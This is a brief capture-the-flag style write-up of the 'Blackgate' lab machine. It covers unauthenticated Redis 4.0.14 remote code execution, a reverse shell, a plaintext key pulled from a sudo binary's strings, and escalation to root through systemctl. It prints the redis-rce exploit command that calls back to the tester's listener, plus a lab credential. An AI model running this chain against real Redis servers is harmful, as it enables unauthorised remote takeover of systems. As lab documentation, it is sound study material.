# Blackgate \[Hard]

## Report

Redis 4.0.14 allows unauthenticated access and is vulnerable to RCE. Obtain reverse shell and user 'prudence' can run a binary 'redis-status' as sudo but asks for an authorization key. Reading strings of binary file exposes password in plaintext and we see binary is running 'systemctl' which is abused to become root.

## Enumeration

192.168.106.176

{% embed url="https://hackviser.com/tactics/pentesting/services/redis" %}

<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

Redis key-value store 4.0.14

`dir at /tmp`

## Loot

### Attack Vectors

SSH key insertion didn't work (Permission denied) and online reverse shell wouldn't work cus we don't have a HTTP port to work with, hence run the exploit

`python3 redis-rce.py -L 192.168.45.236 -r 192.168.106.176 -f module.so`

### PrivEsc

`redis.conf`

```
# requirepass foobared
```

```
User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
```

<div align="left"><figure><img src="../../../.gitbook/assets/image (123).png" alt="" width="405"><figcaption></figcaption></figure></div>

Normally as per google, authorization key is stored at 'redis.conf' but as we can see it is commented out, check your binary strings next time

### Creds

`Reddis_Auth:ClimbingParrotKickingDonkey321`

### Proof

{% embed url="https://github.com/Ridter/redis-rce?tab=readme-ov-file" %}

{% embed url="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" %}
